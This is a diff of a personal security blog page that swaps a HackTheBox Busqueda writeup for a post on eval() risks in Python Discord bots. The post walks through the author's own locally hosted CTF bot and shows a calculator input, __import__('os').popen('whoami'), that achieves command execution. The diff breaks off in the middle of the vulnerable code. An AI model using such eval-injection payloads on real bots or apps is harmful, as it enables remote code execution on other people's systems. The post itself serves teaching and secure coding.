@@ -8,14 +8,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>Busqueda Writeup - HackTheBox &middot; Rezy Dev</title>
-  <meta name="title" content="Busqueda Writeup - HackTheBox &middot; Rezy Dev" />
+  <title>Why You Shouldn&#39;t Use eval() in Discord Bots (or in Any App) &middot; Rezy Dev</title>
+  <meta name="title" content="Why You Shouldn&#39;t Use eval() in Discord Bots (or in Any App) &middot; Rezy Dev" />
   
-  <meta name="description" content="Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a Python module. By leveraging this vulnerability, we gain user-level access to the machine. To escalate privileges to root, we discover credentials within a Git config file, allowing us to log into a local Gitea service. Additionally, we uncover that a system checkup script can be executed with root privileges by a specific user. By utilizing this script, we enumerate Docker containers that reveal credentials for the administrator user&#39;s Gitea account. Further analysis of the system checkup script&#39;s source code in a Git repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with root privileges." />
-  <meta name="keywords" content="HackTheBox, Linux, Easy, NetSecFocus, TJNull, " />
+  <meta name="description" content="Learn how eval() function is evil for discord bots (or in Any App)" />
+  <meta name="keywords" content="eval(), Python, Discord Bot, " />
   
   
-  <link rel="canonical" href="http://localhost:1313/writeups/hackthebox/busqueda/" />
+  <link rel="canonical" href="http://localhost:1313/research/learn-how-eval-function-is-evil-for-discord-bots/" />
   
   
   
@@ -63,44 +63,44 @@
   
   
   
-  <meta property="og:title" content="Busqueda Writeup - HackTheBox" />
-<meta property="og:description" content="Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a Python module. By leveraging this vulnerability, we gain user-level access to the machine. To escalate privileges to root, we discover credentials within a Git config file, allowing us to log into a local Gitea service. Additionally, we uncover that a system checkup script can be executed with root privileges by a specific user. By utilizing this script, we enumerate Docker containers that reveal credentials for the administrator user&#39;s Gitea account. Further analysis of the system checkup script&#39;s source code in a Git repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with root privileges." />
+  <meta property="og:title" content="Why You Shouldn&#39;t Use eval() in Discord Bots (or in Any App)" />
+<meta property="og:description" content="Learn how eval() function is evil for discord bots (or in Any App)" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://localhost:1313/writeups/hackthebox/busqueda/" /><meta property="og:image" content="http://localhost:1313/writeups/hackthebox/busqueda/feature.png" /><meta property="article:section" content="writeups" />
-<meta property="article:published_time" content="2024-10-26T00:00:00+00:00" />
-<meta property="article:modified_time" content="2024-10-26T00:00:00+00:00" />
+<meta property="og:url" content="http://localhost:1313/research/learn-how-eval-function-is-evil-for-discord-bots/" /><meta property="og:image" content="http://localhost:1313/research/learn-how-eval-function-is-evil-for-discord-bots/feature.jpg" /><meta property="article:section" content="research" />
+<meta property="article:published_time" content="2024-12-07T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-12-07T00:00:00+00:00" />
 
 
   <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="http://localhost:1313/writeups/hackthebox/busqueda/feature.png" /><meta name="twitter:title" content="Busqueda Writeup - HackTheBox"/>
-<meta name="twitter:description" content="Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a Python module. By leveraging this vulnerability, we gain user-level access to the machine. To escalate privileges to root, we discover credentials within a Git config file, allowing us to log into a local Gitea service. Additionally, we uncover that a system checkup script can be executed with root privileges by a specific user. By utilizing this script, we enumerate Docker containers that reveal credentials for the administrator user&#39;s Gitea account. Further analysis of the system checkup script&#39;s source code in a Git repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with root privileges."/>
+<meta name="twitter:image" content="http://localhost:1313/research/learn-how-eval-function-is-evil-for-discord-bots/feature.jpg" /><meta name="twitter:title" content="Why You Shouldn&#39;t Use eval() in Discord Bots (or in Any App)"/>
+<meta name="twitter:description" content="Learn how eval() function is evil for discord bots (or in Any App)"/>
 
   
   <script type="application/ld+json">
   [{
     "@context": "https://schema.org",
     "@type": "Article",
-    "articleSection": "Writeups",
-    "name": "Busqueda Writeup - HackTheBox",
-    "headline": "Busqueda Writeup - HackTheBox",
-    "description": "Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a Python module. By leveraging this vulnerability, we gain user-level access to the machine. To escalate privileges to root, we discover credentials within a Git config file, allowing us to log into a local Gitea service. Additionally, we uncover that a system checkup script can be executed with root privileges by a specific user. By utilizing this script, we enumerate Docker containers that reveal credentials for the administrator user\u0027s Gitea account. Further analysis of the system checkup script\u0027s source code in a Git repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with root privileges.",
-    "abstract": "Link: https:\/\/app.",
+    "articleSection": "Research",
+    "name": "Why You Shouldn\u0027t Use eval() in Discord Bots (or in Any App)",
+    "headline": "Why You Shouldn\u0027t Use eval() in Discord Bots (or in Any App)",
+    "description": "Learn how eval() function is evil for discord bots (or in Any App)",
+    "abstract": "Learn how eval() function is evil for discord bots (or in Any App)",
     "inLanguage": "en",
-    "url" : "http:\/\/localhost:1313\/writeups\/hackthebox\/busqueda\/",
+    "url" : "http:\/\/localhost:1313\/research\/learn-how-eval-function-is-evil-for-discord-bots\/",
     "author" : {
       "@type": "Person",
       "name": "Rezy Dev"
     },
     "copyrightYear": "2024",
-    "dateCreated": "2024-10-26T00:00:00\u002b00:00",
-    "datePublished": "2024-10-26T00:00:00\u002b00:00",
+    "dateCreated": "2024-12-07T00:00:00\u002b00:00",
+    "datePublished": "2024-12-07T00:00:00\u002b00:00",
     
-    "dateModified": "2024-10-26T00:00:00\u002b00:00",
+    "dateModified": "2024-12-07T00:00:00\u002b00:00",
     
-    "keywords": ["HackTheBox","Linux","Easy","NetSecFocus","TJNull"],
+    "keywords": ["eval()","Python","Discord Bot"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "1094"
+    "wordCount": "1829"
   }]
   </script>
 
@@ -533,7 +533,7 @@
 
     
     <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
-    style="background-image:url(/writeups/hackthebox/busqueda/feature.png);">
+    style="background-image:url(/research/learn-how-eval-function-is-evil-for-discord-bots/feature.jpg);">
     
 
 
@@ -565,8 +565,6 @@
   
     
   
-    
-  
   <li class="inline hidden">
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
@@ -579,17 +577,8 @@
   <li class="inline ">
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
-      href="/writeups/"
-      >Writeups</a
-    ><span class="px-1 text-primary-500">/</span>
-  </li>
-
-  
-  <li class="inline ">
-    <a
-      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
-      href="/writeups/hackthebox/"
-      >HackTheBox</a
+      href="/research/"
+      >Research</a
     ><span class="px-1 text-primary-500">/</span>
   </li>
 
@@ -597,8 +586,8 @@
   <li class="inline hidden">
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
-      href="/writeups/hackthebox/busqueda/"
-      >Busqueda Writeup - HackTheBox</a
+      href="/research/learn-how-eval-function-is-evil-for-discord-bots/"
+      >Why You Shouldn&#39;t Use eval() in Discord Bots (or in Any App)</a
     ><span class="px-1 text-primary-500">/</span>
   </li>
 
@@ -607,7 +596,7 @@
 
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      Busqueda Writeup - HackTheBox
+      Why You Shouldn't Use eval() in Discord Bots (or in Any App)
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -635,8 +624,6 @@
 
 
 
-  
-
 
 
 
@@ -652,7 +639,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2024-10-26 00:00:00 &#43;0000 UTC">26 October 2024</time><span class="px-2 text-primary-500">&middot;</span><span>1094 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">6 mins</span>
+  <time datetime="2024-12-07 00:00:00 &#43;0000 UTC">7 December 2024</time><span class="px-2 text-primary-500">&middot;</span><span>1829 words</span>
   
 
   
@@ -676,42 +663,26 @@
   
   
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/hackthebox/&#34;,'_self');">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/eval/&#34;,'_self');">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    HackTheBox
+    Eval()
   </span>
 </span>
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/linux/&#34;,'_self');">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/python/&#34;,'_self');">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Linux
+    Python
   </span>
 </span>
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/easy/&#34;,'_self');">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/discord-bot/&#34;,'_self');">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Easy
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/netsecfocus/&#34;,'_self');">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    NetSecFocus
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/tjnull/&#34;,'_self');">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    TJNull
+    Discord Bot
   </span>
 </span>
   </span>
@@ -907,15 +878,23 @@
     class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#how-does-eval-work">How Does <code>eval()</code> Work?</a></li>
+    <li><a href="#the-risks-of-eval">The Risks of <code>eval()</code></a>
       <ul>
-        <li><a href="#nmap-scan">Nmap Scan</a></li>
+        <li><a href="#lets-exploit-eval">Let&rsquo;s exploit <code>eval()</code></a></li>
       </ul>
     </li>
-    <li><a href="#port-80-http">Port 80 (http)</a>
+  </ul>
+
+  <ul>
+    <li><a href="#safe-deployment">Safe Deployment</a></li>
+  </ul>
+
+  <ul>
+    <li>
       <ul>
-        <li><a href="#explanation-of-the-vulnerability">Explanation of the Vulnerability</a></li>
-        <li><a href="#poc--exploit">PoC &amp; Exploit</a></li>
+        <li><a href="#fixing-the-code-to-make-it-safer">Fixing the Code to Make It Safer</a></li>
+        <li><a href="#best-practices-for-using-eval">Best Practices for Using <code>eval()</code></a></li>
       </ul>
     </li>
   </ul>
@@ -931,15 +910,23 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#how-does-eval-work">How Does <code>eval()</code> Work?</a></li>
+    <li><a href="#the-risks-of-eval">The Risks of <code>eval()</code></a>
       <ul>
-        <li><a href="#nmap-scan">Nmap Scan</a></li>
+        <li><a href="#lets-exploit-eval">Let&rsquo;s exploit <code>eval()</code></a></li>
       </ul>
     </li>
-    <li><a href="#port-80-http">Port 80 (http)</a>
+  </ul>
+
+  <ul>
+    <li><a href="#safe-deployment">Safe Deployment</a></li>
+  </ul>
+
+  <ul>
+    <li>
       <ul>
-        <li><a href="#explanation-of-the-vulnerability">Explanation of the Vulnerability</a></li>
-        <li><a href="#poc--exploit">PoC &amp; Exploit</a></li>
+        <li><a href="#fixing-the-code-to-make-it-safer">Fixing the Code to Make It Safer</a></li>
+        <li><a href="#best-practices-for-using-eval">Best Practices for Using <code>eval()</code></a></li>
       </ul>
     </li>
   </ul>
@@ -1023,299 +1010,313 @@
 
 
         <div class="article-content max-w-prose mb-20">
-          <table>
-<thead>
-<tr>
-<th>Link:</th>
-<th><a href="https://app.hackthebox.com/machines/Busqueda" target="_blank">https://app.hackthebox.com/machines/Busqueda</a></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Difficulty</td>
-<td>Easy</td>
-</tr>
-<tr>
-<td>Machine</td>
-<td>Linux</td>
-</tr>
-</tbody>
-</table>
-<hr>
+          <p>Hello, everyone! In this blog, I want to showcase a dangerous function that, if used improperly, can cause serious harm, whether in a web app or elsewhere. In this article, I’ll focus on the abuse of <code>eval()</code> in Discord bots. While it&rsquo;s rare to find it, if you ever come across it or discover that a bot is using it, it&rsquo;s incredibly dangerous.</p>
 
 
-<h1 class="relative group">Enumeration 
-    <div id="enumeration" class="anchor"></div>
+<h1 class="relative group">Introduction 
+    <div id="introduction" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#enumeration" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#introduction" aria-label="Anchor">#</a>
     </span>        
     
 </h1>
+<p>For this demonstration, I’ll be using the Discord bot source code I wrote for the WSC CTF 2024 Qualifier. The bot was titled &ldquo;Evil-Bot&rdquo;. I won’t go into too much detail, but here’s the screenshot I shared with them:
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="assets/Pasted%20image%2020241207132908.png" alt="" />
+      
+    </figure>
+</p>
+<p>The screenshot already provided most of the hints needed to solve the CTF. However, we won’t be using the image or inviting the bot using the client ID from the screenshot, as the bot is now down. Instead, I encourage you to set up the bot locally using Docker and abuse it in that environment.</p>
 
 
-<h3 class="relative group">Nmap Scan 
-    <div id="nmap-scan" class="anchor"></div>
+<h1 class="relative group">Download and Setup 
+    <div id="download-and-setup" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#nmap-scan" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#download-and-setup" aria-label="Anchor">#</a>
     </span>        
     
-</h3>
-<pre tabindex="0"><code>22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
-| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
-|   256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
-|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
-80/tcp open  http    syn-ack Apache httpd 2.4.52
-|_http-title: Did not follow redirect to http://searcher.htb/
-|_http-server-header: Apache/2.4.52 (Ubuntu)
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
-Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre>
+</h1>
+<p>Since I don&rsquo;t want to go over how to download the bot’s source code and set it up in your local environment, I’ve written a detailed <code>README.md</code> on how to get the source code and bring the Discord bot online. You can find it in the GitHub repository here: <a href="https://github.com/Rezy-Dev/Evil-Bot" target="_blank">https://github.com/Rezy-Dev/Evil-Bot</a></p>
+<p>You will need to install Docker Engine, which you can do by following the instructions here: <a href="https://docs.docker.com/engine/install/ubuntu/" target="_blank">https://docs.docker.com/engine/install/ubuntu/</a> (this link is for Ubuntu, but you can find installation instructions for other distributions in the documentation). If you&rsquo;re using Windows or macOS, you can also find installation guides on the same website.</p>
 
-<h2 class="relative group">Port 80 (http) 
-    <div id="port-80-http" class="anchor"></div>
+
+<h1 class="relative group">About The Bot 
+    <div id="about-the-bot" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#port-80-http" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#about-the-bot" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+<p>Before starting the exploitation and looking at source code, we will generally learn how the asset works. In this case, we will learn how the discord bot works and what feature it gives us.</p>
+<p>Below is an image of the <code>!help</code> command, which lists all the other commands that can be used.
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="assets/Pasted%20image%2020241207134000.png" alt="" />
+      
+    </figure>
+</p>
+<p>Without wasting much time looking at each commands, let me give you general overview of what the following command does using following table:
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="assets/Pasted%20image%2020241207134330.png" alt="" />
+      
+    </figure>
+</p>
+
+
+<h1 class="relative group">Accessing vulnerable function 
+    <div id="accessing-vulnerable-function" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#accessing-vulnerable-function" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+<p>So we will use <code>!work</code> for few times until we have enough cash to purchase calculator. The calculator costs $500 if you check the source code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@bot.command</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">buy</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">item</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">load_data</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">user_id</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">ctx</span><span class="o">.</span><span class="n">author</span><span class="o">.</span><span class="n">id</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">item</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&#34;calculator&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cost</span> <span class="o">=</span> <span class="mi">500</span> <span class="c1">## THIS IS THE COST OF CALCULATOR</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user_id</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">data</span><span class="p">[</span><span class="s2">&#34;users&#34;</span><span class="p">]</span> <span class="ow">or</span> <span class="n">data</span><span class="p">[</span><span class="s2">&#34;users&#34;</span><span class="p">][</span><span class="n">user_id</span><span class="p">][</span><span class="s2">&#34;cash&#34;</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">cost</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;You don&#39;t have enough cash to buy the calculator.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="p">[</span><span class="s2">&#34;users&#34;</span><span class="p">][</span><span class="n">user_id</span><span class="p">][</span><span class="s2">&#34;cash&#34;</span><span class="p">]</span> <span class="o">-=</span> <span class="n">cost</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="p">[</span><span class="s2">&#34;users&#34;</span><span class="p">][</span><span class="n">user_id</span><span class="p">][</span><span class="s2">&#34;calculator&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">        <span class="n">save_data</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;You have purchased the calculator!&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>When I purchase <code>!buy calculator</code> we get access to <code>!calculator</code> command.
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="assets/Pasted%20image%2020241207134752.png" alt="" />
+      
+    </figure>
+</p>
+<p>And we can use following command to calculate:
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="assets/Pasted%20image%2020241207134840.png" alt="" />
+      
+    </figure>
+</p>
+<p>This seems interesting, doesn’t it? The bot directly accepts the input <code>!calculator &lt;math expression&gt;</code>, calculates it, and shows us the result.</p>
+
+
+<h1 class="relative group">eval() is actually evil 
+    <div id="eval-is-actually-evil" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#eval-is-actually-evil" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+<p>How is it directly accepting both the operator and operand from the user and calculating the result? It’s all thanks to the <code>eval()</code> function.</p>
+<p>The <code>eval()</code> function in Python takes a string and evaluates it as a Python expression. It can execute any valid Python code within the string passed to it. For example:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">expression</span> <span class="o">=</span> <span class="s2">&#34;3 + 5 * 2&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">expression</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>  <span class="c1"># Output: 13</span>
+</span></span></code></pre></div><p>In this example, <code>eval()</code> takes the string <code>&quot;3 + 5 * 2&quot;</code>, evaluates it as a Python expression, and returns the result <code>13</code>.</p>
+<p>It can execute arbitrary Python code, return a result, or perform operations based on the expression passed. In essence, it works like the interactive console in Python, where you can enter Python code, and the interpreter executes it immediately.</p>
+
+
+<h2 class="relative group">How Does <code>eval()</code> Work? 
+    <div id="how-does-eval-work" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#how-does-eval-work" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
-<p>I added <code>searcher.htb</code> to my <code>/etc/hosts</code> file and checked the site. This is what the site looks like:
+<p><code>eval()</code> operates by parsing the string expression and evaluating it as Python code. Here’s the basic process:</p>
+<ol>
+<li><strong>String to Code</strong>: The string passed to <code>eval()</code> is parsed into Python bytecode.</li>
+<li><strong>Execution</strong>: The bytecode is executed in the current environment (i.e., it can access variables, functions, and objects defined in the current scope).</li>
+<li><strong>Return Value</strong>: The result of the expression is returned.</li>
+</ol>
+<p>It works in a very similar way to the Python interactive shell. In the interactive shell, you type in a Python expression, and the interpreter immediately evaluates and returns the result:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">╭─</span><span class="n">rezy</span><span class="nd">@dev</span> <span class="o">~</span>  
+</span></span><span class="line"><span class="cl"><span class="err">╰─➤</span>  <span class="n">python3</span>                    
+</span></span><span class="line"><span class="cl"><span class="n">Python</span> <span class="mf">3.12.3</span> <span class="p">(</span><span class="n">main</span><span class="p">,</span> <span class="n">Sep</span> <span class="mi">11</span> <span class="mi">2024</span><span class="p">,</span> <span class="mi">14</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">37</span><span class="p">)</span> <span class="p">[</span><span class="n">GCC</span> <span class="mf">13.2.0</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux</span>
+</span></span><span class="line"><span class="cl"><span class="n">Type</span> <span class="s2">&#34;help&#34;</span><span class="p">,</span> <span class="s2">&#34;copyright&#34;</span><span class="p">,</span> <span class="s2">&#34;credits&#34;</span> <span class="ow">or</span> <span class="s2">&#34;license&#34;</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="mi">3</span> <span class="o">+</span> <span class="mi">5</span> <span class="o">*</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="mi">13</span>
+</span></span></code></pre></div><p>This is almost identical to how <code>eval()</code> functions. It evaluates an expression and gives you an immediate result.</p>
 
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="assets/Pasted%20image%2020241026095230.png" alt="" />
-      
-    </figure>
-</p>
-<p>After exploring the site and performing enumeration, such as directory fuzzing, I noticed that the site uses Flask and Searchor 2.4.0. Here, Searchor 2.4.0 is vulnerable to command injection.</p>
 
-
-<h3 class="relative group">Explanation of the Vulnerability 
-    <div id="explanation-of-the-vulnerability" class="anchor"></div>
+<h2 class="relative group">The Risks of <code>eval()</code> 
+    <div id="the-risks-of-eval" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#explanation-of-the-vulnerability" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#the-risks-of-eval" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>While <code>eval()</code> is incredibly flexible and powerful, it comes with <strong>severe security risks</strong>. The most dangerous aspect of <code>eval()</code> is that it can execute arbitrary code. This makes it a prime target for exploitation if user input is not properly sanitized.</p>
+
+
+<h3 class="relative group">Let&rsquo;s exploit <code>eval()</code> 
+    <div id="lets-exploit-eval" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#lets-exploit-eval" aria-label="Anchor">#</a>
     </span>        
     
 </h3>
-<p>In file <strong><code>src/sarchor/main.py</code></strong> of <strong><code>Searchor &lt;= 2.4.2</code></strong> there is a function call <strong><code>eval()</code></strong>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@click.argument</span><span class="p">(</span><span class="s2">&#34;query&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">search</span><span class="p">(</span><span class="n">engine</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="nb">open</span><span class="p">,</span> <span class="n">copy</span><span class="p">):</span>
+<p>Since we have the Discord bot, which uses the <code>eval()</code> function for the <code>!calculator</code> command, we can exploit it for remote code execution.</p>
+<p>Since we know the Discord bot uses the <code>!calculator 1+1</code> command, which is evaluated using the <code>eval()</code> function, we can abuse this by importing the <code>os</code> module and calling a function of our choice to execute system commands on the host system. For example, we can execute the following command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">!</span><span class="n">calculator</span> <span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span></code></pre></div><p>This exploits the <code>eval()</code> function to import the <code>os</code> module, use <code>popen()</code> to execute the <code>whoami</code> system command, and then return the result, which will reveal the username of the current system user (i.e, <code>bot_user</code> if you check <code>Dockerfile</code>).
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="assets/Pasted%20image%2020241207140355.png" alt="" />
+      
+    </figure>
+</p>
+<p>If we check the source code of the bot, we can see the vulnerable code that directly passes the user&rsquo;s input to the <code>eval()</code> function:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@bot.command</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">calculator</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">*</span><span class="p">,</span> <span class="n">expression</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">load_data</span><span class="p">()</span>
